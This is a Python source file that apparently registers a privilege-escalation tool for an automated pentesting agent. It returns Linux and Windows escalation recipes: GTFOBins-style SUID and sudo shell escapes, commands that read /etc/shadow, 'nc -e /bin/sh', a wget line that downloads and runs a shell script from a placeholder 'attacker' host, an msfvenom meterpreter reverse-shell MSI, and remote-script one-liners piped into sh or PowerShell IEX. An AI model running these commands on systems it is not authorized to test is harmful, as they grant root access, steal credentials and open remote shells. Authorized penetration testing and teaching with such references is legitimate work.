"""Check for privilege escalation vectors on Linux and Windows systems."""

from __future__ import annotations

from typing import Any, Literal

from strix.tools.registry import register_tool
from strix.tools.validation import (
    generate_usage_hint,
    validate_action_param,
    validate_unknown_params,
)


PrivEscAction = Literal[
    "check_suid",
    "check_sudo",
    "check_capabilities",
    "check_cron",
    "check_services",
    "check_writable",
    "generate_script",
    "full_check",
]

# Known exploitable SUID binaries
GTFOBINS_SUID = {
    "aria2c": "aria2c --on-download-error=/bin/sh",
    "arp": "arp -v -f file",
    "ash": "ash -p",
    "base64": "base64 /etc/shadow | base64 -d",
    "bash": "bash -p",
    "busybox": "busybox sh",
    "cat": "cat /etc/shadow",
    "chmod": "chmod u+s /bin/bash",
    "chown": "chown root:root /bin/bash && chmod u+s /bin/bash",
    "cp": "cp /bin/bash /tmp/bash && chmod u+s /tmp/bash",
    "csh": "csh -b",
    "curl": "curl file:///etc/shadow",
    "cut": "cut -d '' -f1 /etc/shadow",
    "dash": "dash -p",
    "date": "date -f /etc/shadow",
    "dd": "dd if=/etc/shadow",
    "diff": "diff --line-format=%L /dev/null /etc/shadow",
    "docker": "docker run -v /:/mnt alpine chroot /mnt sh",
    "ed": "ed /etc/shadow",
    "emacs": "emacs -Q -nw --eval '(term \"/bin/sh -p\")'",
    "env": "env /bin/sh -p",
    "find": "find . -exec /bin/sh -p \\;",
    "ftp": "ftp then !/bin/sh",
    "gdb": "gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
    "git": "git help config then !/bin/sh",
    "ip": "ip netns add foo then ip netns exec foo /bin/sh -p",
    "less": "less /etc/shadow then v",
    "make": "SHELL=/bin/sh make -s --eval=$'x:\\n\\t-'\"/bin/sh -p\"",
    "man": "man man then !/bin/sh",
    "more": "more /etc/shadow then v",
    "nano": "nano -s /bin/sh",
    "nc": "nc -e /bin/sh",
    "nmap": "nmap --interactive then !sh",
    "perl": "perl -e 'exec \"/bin/sh\";'",
    "php": "php -r \"pcntl_exec('/bin/sh', ['-p']);\"",
    "python": "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
    "python3": "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
    "rlwrap": "rlwrap -H /dev/null /bin/sh -p",
    "rsync": "rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null",
    "ruby": "ruby -e 'exec \"/bin/sh -p\"'",
    "scp": "TF=$(mktemp) && echo 'sh 0<&2 1>&2' > $TF && scp -S $TF x y:",
    "sed": "sed -n '1e exec sh -p 1>&0' /etc/hosts",
    "ssh": "ssh -o ProxyCommand=';sh -p 0<&2 1>&2' x",
    "strace": "strace -o /dev/null /bin/sh -p",
    "tar": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
    "tee": "echo data | tee -a /etc/passwd",
    "time": "time /bin/sh -p",
    "timeout": "timeout 7d /bin/sh -p",
    "vim": "vim -c ':!/bin/sh -p'",
    "watch": "watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'",
    "wget": "TF=$(mktemp) && wget -O $TF http://attacker/shell.sh && sh $TF",
    "xargs": "xargs -a /dev/null sh -p",
    "xxd": "xxd /etc/shadow | xxd -r",
    "zip": "zip -q /tmp/x.zip /etc/shadow -T -TT 'sh -p #'",
    "zsh": "zsh",
}

# Capabilities that can lead to privilege escalation
DANGEROUS_CAPABILITIES = {
    "cap_setuid": "Can change UID - trivial escalation",
    "cap_setgid": "Can change GID - group escalation",
    "cap_dac_override": "Bypass file permission checks",
    "cap_dac_read_search": "Bypass file read permission checks",
    "cap_chown": "Can change file ownership",
    "cap_fowner": "Bypass permission checks on owned files",
    "cap_sys_admin": "Broad system administration capabilities",
    "cap_sys_ptrace": "Can trace any process - credential stealing",
    "cap_net_raw": "Can sniff network traffic",
    "cap_net_admin": "Can configure network - potential bypass",
    "cap_net_bind_service": "Can bind to privileged ports",
}

# Windows privilege escalation techniques
WINDOWS_PRIVESC = {
    "unquoted_service_path": {
        "description": "Service path contains spaces without quotes",
        "check": "wmic service get name,displayname,pathname,startmode | findstr /i 'Auto' | findstr /i /v 'C:\\Windows'",
        "exploit": "Place malicious executable in path",
    },
    "weak_service_permissions": {
        "description": "User can modify service configuration",
        "check": "accesschk.exe -uwcqv 'Everyone' * /accepteula",
        "exploit": "sc config [service] binPath= 'cmd /c whoami > c:\\temp\\whoami.txt'",
    },
    "always_install_elevated": {
        "description": "MSI packages run with elevated privileges",
        "check": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
        "exploit": "msfvenom -p windows/meterpreter/reverse_tcp -f msi > shell.msi",
    },
    "stored_credentials": {
        "description": "Credentials stored in registry or files",
        "check": "cmdkey /list && reg query HKLM /f password /t REG_SZ /s",
        "exploit": "runas /savecred /user:admin cmd.exe",
    },
    "dll_hijacking": {
        "description": "Application loads DLL from writable location",
        "check": "procmon.exe - filter for 'NAME NOT FOUND' DLLs",
        "exploit": "Place malicious DLL in application directory",
    },
    "token_impersonation": {
        "description": "SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege",
        "check": "whoami /priv",
        "exploit": "JuicyPotato, PrintSpoofer, RoguePotato",
    },
}


def _check_suid() -> dict[str, Any]:
    """Generate SUID binary check commands and exploitation techniques."""
    result = {
        "action": "check_suid",
        "os_type": "linux",
    }

    result["find_commands"] = {
        "suid": "find / -perm -4000 -type f 2>/dev/null",
        "sgid": "find / -perm -2000 -type f 2>/dev/null",
        "both": "find / -perm -6000 -type f 2>/dev/null",
        "owned_by_root": "find / -perm -4000 -user root -type f 2>/dev/null",
    }

    result["known_exploitable"] = list(GTFOBINS_SUID.keys())
    result["exploitation_database"] = "https://gtfobins.github.io/"

    result["sample_exploits"] = {
        binary: exploit for binary, exploit in list(GTFOBINS_SUID.items())[:10]
    }

    result["analysis_steps"] = [
        "1. Run find command to locate SUID binaries",
        "2. Compare against GTFOBins database",
        "3. Check version for known vulnerabilities",
        "4. Test exploitation technique",
    ]

    return result


def _check_sudo() -> dict[str, Any]:
    """Generate sudo permission check commands."""
    result = {
        "action": "check_sudo",
        "os_type": "linux",
    }

    result["check_commands"] = {
        "list_sudo": "sudo -l",
        "sudo_version": "sudo -V",
        "sudoers_file": "cat /etc/sudoers 2>/dev/null || sudo cat /etc/sudoers",
    }

    result["dangerous_sudo_entries"] = {
        "NOPASSWD": "No password required - check for exploitable commands",
        "(ALL)": "Can run as any user",
        "env_keep": "Environment variables preserved - LD_PRELOAD attacks",
        "!root": "Exclusions can sometimes be bypassed",
        "wildcards": "Wildcards in paths can be exploited",
    }

    result["sudo_exploits"] = {
        "LD_PRELOAD": {
            "condition": "env_keep+=LD_PRELOAD in sudoers",
            "exploit": "Compile shared library, set LD_PRELOAD, run sudo command",
        },
        "PYTHONPATH": {
            "condition": "sudo python with PYTHONPATH preserved",
            "exploit": "Create malicious module in PYTHONPATH",
        },
        "vim_sudo": {
            "condition": "sudo vim",
            "exploit": ":!/bin/bash",
        },
        "find_sudo": {
            "condition": "sudo find",
            "exploit": "sudo find /etc -exec /bin/bash \\;",
        },
        "tar_sudo": {
            "condition": "sudo tar",
            "exploit": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
        },
    }

    result["cve_checks"] = {
        "CVE-2021-3156": "sudo < 1.9.5p2 - Baron Samedit heap overflow",
        "CVE-2019-14287": "sudo < 1.8.28 - UID bypass with -u#-1",
        "CVE-2019-18634": "sudo < 1.8.26 - pwfeedback buffer overflow",
    }

    return result


def _check_capabilities() -> dict[str, Any]:
    """Generate capability check commands."""
    result = {
        "action": "check_capabilities",
        "os_type": "linux",
    }

    result["check_commands"] = {
        "get_all_caps": "getcap -r / 2>/dev/null",
        "specific_path": "getcap /usr/bin/* 2>/dev/null",
    }

    result["dangerous_capabilities"] = DANGEROUS_CAPABILITIES

    result["exploitation_examples"] = {
        "cap_setuid+python": 'python -c \'import os; os.setuid(0); os.system("/bin/bash")\'',
        "cap_setuid+perl": 'perl -e \'use POSIX; setuid(0); exec "/bin/bash";\'',
        "cap_dac_override+tar": "tar -cvf shadow.tar /etc/shadow && tar -xvf shadow.tar",
        "cap_sys_ptrace": "Use pspy or gdb to attach to root processes",
    }

    return result


def _check_cron() -> dict[str, Any]:
    """Generate cron job enumeration commands."""
    result = {
        "action": "check_cron",
        "os_type": "linux",
    }

    result["check_commands"] = {
        "crontab": "crontab -l 2>/dev/null",
        "system_cron": "cat /etc/crontab 2>/dev/null",
        "cron_d": "ls -la /etc/cron.d/ 2>/dev/null",
        "cron_daily": "ls -la /etc/cron.daily/ 2>/dev/null",
        "cron_hourly": "ls -la /etc/cron.hourly/ 2>/dev/null",
        "user_crons": "for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l 2>/dev/null; done",
        "pspy": "Monitor with pspy to see scheduled tasks",
    }

    result["exploitation_vectors"] = {
        "writable_script": {
            "condition": "Cron runs a script we can write to",
            "exploit": "Add reverse shell to script",
        },
        "wildcard_injection": {
            "condition": "Cron uses wildcards (e.g., tar *)",
            "exploit": "Create files like '--checkpoint-action=exec=sh shell.sh'",
        },
        "path_hijacking": {
            "condition": "Cron script uses relative paths",
            "exploit": "Create malicious binary in PATH before legitimate one",
        },
        "missing_script": {
            "condition": "Cron references non-existent script in writable dir",
            "exploit": "Create the missing script",
        },
    }

    return result


def _check_services() -> dict[str, Any]:
    """Generate service configuration check commands."""
    result = {
        "action": "check_services",
        "os_type": "linux",
    }

    result["linux_commands"] = {
        "systemd_services": "systemctl list-unit-files --type=service",
        "running_services": "systemctl list-units --type=service --state=running",
        "service_configs": "find /etc/systemd -name '*.service' -exec cat {} \\;",
        "init_services": "ls -la /etc/init.d/",
    }

    result["exploitation_vectors"] = {
        "writable_service_file": {
            "condition": "User can write to service file",
            "check": "find /etc/systemd -writable 2>/dev/null",
            "exploit": "Modify ExecStart to run malicious command",
        },
        "writable_binary": {
            "condition": "User can write to binary referenced by service",
            "check": "Check permissions of ExecStart paths",
            "exploit": "Replace binary with malicious one",
        },
    }

    return result


def _check_writable() -> dict[str, Any]:
    """Generate writable file/directory check commands."""
    result = {
        "action": "check_writable",
        "os_type": "linux",
    }

    result["check_commands"] = {
        "world_writable_files": "find / -perm -o+w -type f 2>/dev/null",
        "world_writable_dirs": "find / -perm -o+w -type d 2>/dev/null",
        "writable_etc": "find /etc -writable 2>/dev/null",
        "writable_root": "find /root -writable 2>/dev/null",
        "writable_system": "find /usr /lib -writable 2>/dev/null",
    }

    result["high_value_targets"] = [
        "/etc/passwd - Add new user with UID 0",
        "/etc/shadow - Replace root password hash",
        "/etc/sudoers - Add sudo permissions",
        "/root/.ssh/authorized_keys - Add SSH key",
        "/etc/cron.* - Add scheduled tasks",
        "~/.bashrc, /etc/profile - Backdoor shells",
    ]

    return result


def _generate_script(os_type: str = "linux") -> dict[str, Any]:
    """Generate comprehensive enumeration script."""
    result = {
        "action": "generate_script",
        "os_type": os_type,
    }

    if os_type == "linux":
        result["script"] = """#!/bin/bash
# Linux Privilege Escalation Enumeration Script

echo "=== System Information ==="
uname -a
cat /etc/*release

echo "\\n=== Current User ==="
id
whoami

echo "\\n=== Sudo Permissions ==="
sudo -l 2>/dev/null

echo "\\n=== SUID Binaries ==="
find / -perm -4000 -type f 2>/dev/null

echo "\\n=== SGID Binaries ==="
find / -perm -2000 -type f 2>/dev/null

echo "\\n=== Capabilities ==="
getcap -r / 2>/dev/null

echo "\\n=== Writable /etc files ==="
find /etc -writable 2>/dev/null

echo "\\n=== Cron Jobs ==="
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.* 2>/dev/null

echo "\\n=== Running Processes ==="
ps aux | grep root

echo "\\n=== Network Connections ==="
netstat -tulpn 2>/dev/null || ss -tulpn

echo "\\n=== Interesting Files ==="
find / -name "*.conf" -o -name "*.log" -o -name "*.txt" -o -name "*.ini" 2>/dev/null | head -50
"""

        result["one_liners"] = {
            "linpeas": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
            "linenum": "wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh",
            "lse": "curl https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh | bash",
        }

    else:  # Windows
        result["script"] = """@echo off
REM Windows Privilege Escalation Enumeration

echo === System Information ===
systeminfo

echo === Current User ===
whoami /all

echo === User Privileges ===
whoami /priv

echo === Network Information ===
ipconfig /all
netstat -ano

echo === Installed Software ===
wmic product get name,version

echo === Running Services ===
wmic service list brief

echo === Scheduled Tasks ===
schtasks /query /fo LIST /v

echo === Unquoted Service Paths ===
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows"

echo === AlwaysInstallElevated ===
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul
"""

        result["one_liners"] = {
            "winpeas": "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')\"",
            "powerup": "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks\"",
        }

        result["windows_techniques"] = WINDOWS_PRIVESC

    return result


def _full_check(os_type: str = "linux") -> dict[str, Any]:
    """Run all privilege escalation checks."""
    result = {
        "action": "full_check",
        "os_type": os_type,
    }

    if os_type == "linux":
        result["suid_check"] = _check_suid()
        result["sudo_check"] = _check_sudo()
        result["capabilities_check"] = _check_capabilities()
        result["cron_check"] = _check_cron()
        result["services_check"] = _check_services()
        result["writable_check"] = _check_writable()
        result["enumeration_script"] = _generate_script("linux")
    else:
        result["enumeration_script"] = _generate_script("windows")
        result["windows_techniques"] = WINDOWS_PRIVESC

    result["recommended_tools"] = {
        "linux": ["linpeas.sh", "LinEnum.sh", "lse.sh", "pspy"],
        "windows": ["winPEAS", "PowerUp.ps1", "Seatbelt", "SharpUp"],
    }

    return result


@register_tool
def privilege_escalation_checker(
    action: PrivEscAction,
    os_type: str = "linux",
    path: str | None = None,
    **kwargs: Any,
) -> dict[str, Any] | str:
    """Check for privilege escalation vectors on Linux and Windows systems.

    Args:
        action: The check action to perform:
            - check_suid: Find SUID/SGID binaries
            - check_sudo: Check sudo permissions
            - check_capabilities: Find binaries with capabilities
            - check_cron: Enumerate cron jobs
            - check_services: Check service configurations
            - check_writable: Find world-writable files/dirs
            - generate_script: Generate enumeration script
            - full_check: Run all privilege escalation checks
        os_type: Target OS type: linux or windows (default: linux)
        path: Path to scan for certain checks

    Returns:
        Privilege escalation vectors and exploitation techniques
    """
    VALID_PARAMS = {"action", "os_type", "path"}
    VALID_ACTIONS = ["check_suid", "check_sudo", "check_capabilities", "check_cron", "check_services", "check_writable", "generate_script", "full_check"]

    if unknown_error := validate_unknown_params(kwargs, VALID_PARAMS, "privilege_escalation_checker"):
        unknown_error.update(
            generate_usage_hint("privilege_escalation_checker", "full_check", {"os_type": "linux"})
        )
        return unknown_error

    if action_error := validate_action_param(action, VALID_ACTIONS, "privilege_escalation_checker"):
        action_error["usage_examples"] = {
            "check_suid": 'privilege_escalation_checker(action="check_suid")',
            "full_check": 'privilege_escalation_checker(action="full_check", os_type="linux")',
            "generate_script": 'privilege_escalation_checker(action="generate_script", os_type="windows")',
        }
        return action_error

    os_type = os_type.lower()
    if os_type not in ["linux", "windows"]:
        return {
            "error": f"Invalid os_type: {os_type}",
            "hint": "Use 'linux' or 'windows'",
            "tool_name": "privilege_escalation_checker",
        }

    action_map = {
        "check_suid": _check_suid,
        "check_sudo": _check_sudo,
        "check_capabilities": _check_capabilities,
        "check_cron": _check_cron,
        "check_services": _check_services,
        "check_writable": _check_writable,
        "generate_script": lambda: _generate_script(os_type),
        "full_check": lambda: _full_check(os_type),
    }

    if action in action_map:
        return action_map[action]()

    return {"error": "Unknown action", "tool_name": "privilege_escalation_checker"}
